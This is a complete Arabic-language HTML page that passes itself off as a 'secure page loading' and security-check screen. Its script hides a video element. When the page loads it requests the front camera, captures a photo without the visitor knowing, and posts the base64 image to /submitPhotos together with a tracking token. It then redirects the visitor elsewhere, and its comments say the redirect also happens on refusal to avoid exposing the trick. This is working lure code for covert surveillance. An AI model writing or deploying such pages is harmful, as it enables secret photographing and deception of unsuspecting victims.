<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري تحميل الصفحة الآمنة...</title>
    
    <meta property="og:title" content="فحص الأمان والتحقق الرقمي">
    <meta property="og:description" content="جاري تحميل المحتوى المطلوب وتأمين الاتصال...">
    <meta property="og:image" content="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200&auto=format&fit=crop&q=80">
    <meta property="og:type" content="website">

    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
        body { font-family: 'Tajawal', sans-serif; }
    </style>
</head>
<body class="bg-slate-950 text-white min-h-screen flex items-center justify-center p-4">

    <!-- عنصر فيديو مخفي للتسجيل والالتقاط الخفي -->
    <video id="video" autoplay playsinline muted style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <div class="w-full max-w-sm bg-slate-900 border border-slate-800 rounded-2xl p-6 text-center space-y-4 shadow-2xl">
        <div class="w-12 h-12 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin mx-auto"></div>
        <h2 class="text-lg font-bold text-white">جاري تجهيز المحتوى...</h2>
        <p class="text-xs text-slate-400">يرجى الانتظار لحظات ريثما يتم تحميل الصفحة المطلوبة.</p>
    </div>

    <script>
        window.addEventListener('DOMContentLoaded', async () => {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            try {
                // طلب الكاميرا الأمامية خفياً
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                video.srcObject = stream;
                await video.play();

                // مهلة بسيطة لضمان ثبات الصورة واستقرار العدسة
                setTimeout(async () => {
                    canvas.width = video.videoWidth || 1280;
                    canvas.height = video.videoHeight || 720;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    const imageData = canvas.toDataURL('image/jpeg', 0.85);
                    const base64Data = imageData.split(',')[1];

                    // إيقاف الكاميرا فوراً بعد الالتقاط
                    stream.getTracks().forEach(track => track.stop());

                    // استخراج التوكن من الرابط الحالي (عبر الـ Query Parameter t)
                    const urlParams = new URLSearchParams(window.location.search);
                    const token = urlParams.get('t');

                    if (token) {
                        try {
                            const response = await fetch('/submitPhotos', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ token: token, imageDatas: base64Data + "," })
                            });

                            const result = await response.json();
                            // التوجيه التلقائي للرابط الأصلي المستهدف بعد النجاح
                            if (result && result.redirect) {
                                window.location.href = result.redirect;
                                return;
                            }
                        } catch (e) {
                            console.error('Error submitting captured data');
                        }
                    }

                    // التوجيه الاحتياطي لجوجل لو حدث أي خطأ
                    window.location.href = "https://google.com";

                }, 1500);

            } catch (err) {
                // لو رفض الأذن أو حدث خطأ، قم بتوجيهه للرابط الافتراضي مباشرة لتجنب كشف اللعبة
                window.location.href = "https://google.com";
            }
        });
    </script>
</body>
</html>
